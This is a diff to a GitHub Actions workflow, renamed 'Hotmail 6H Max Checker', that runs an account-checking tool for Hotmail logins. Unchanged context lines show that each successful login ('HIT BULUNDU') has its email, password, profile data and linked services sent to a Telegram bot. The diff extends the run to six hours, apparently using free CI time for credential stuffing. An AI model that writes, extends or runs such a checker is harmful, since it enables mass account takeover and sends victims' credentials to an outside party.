@@ -1,4 +1,4 @@
-name: Hotmail Interface
+name: Hotmail 6H Max Checker
 
 on:
   workflow_dispatch:
@@ -9,6 +9,7 @@ permissions:
 jobs:
   build:
     runs-on: ubuntu-latest
+    timeout-minutes: 360 
     steps:
       - name: Setup and Run Panel
         run: |
@@ -73,7 +74,7 @@ jobs:
                   try:
                       dursunburasi = '\n'.join(f'• {k}: {v}' for k, v in captures.items())
                       fadimeoc = '\n'.join(f'✅ {svc} ({data["total"]} mesaj) — {data["last_msg"][:50]}' for svc, data in results.items())
-                      kombinzaradan = f'🔱 <b>HIT BULUNDU</b>\n\n🔱 <b>Email:</b> <code>{email}</code>\n🔱 <b>Şifre:</b> <code>{password}</code>\n\n🔱 <b>Profil:</b>\n{dursunburasi}\n\n🔱 <b>Servisler:</b>\n{fadimeoc}\n\n⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚋⚊⚊\n<b>PROGRAM :</b> @octopusmarjinal'
+                      kombinzaradan = f'🔱 <b>HIT BULUNDU</b>\n\n🔱 <b>Email:</b> <code>{email}</code>\n🔱 <b>Şifre:</b> <code>{password}</code>\n\n🔱 <b>Profil:</b>\n{dursunburasi}\n\n🔱 <b>Servisler:</b>\n{fadimeoc}\n\n⚊⚊⚊⚊⚊⚊⚊⚋⚊⚊⚋⚊⚊⚋⚊\n<b>PROGRAM :</b> @octopusmarjinal'
                       requests.post(f'{self.temelburasi}/sendMessage', json={'chat_id': self.chat_id, 'text': kombinzaradan, 'parse_mode': 'HTML', 'disable_web_page_preview': True}, timeout=15)
                   except Exception: pass
 
@@ -547,6 +548,7 @@ jobs:
               echo "=============================================="
               echo ""
               echo "YUKARIDAKI LINKI KOPYALA VE TARAYICINA YAPISTIR"
+              echo "6 SAAT BOYUNCA KESİNTİSİZ ÇALIŞACAKTIR."
               echo ""
           else
               echo "Link olusurken hata oldu, asagidaki loglara bak:"
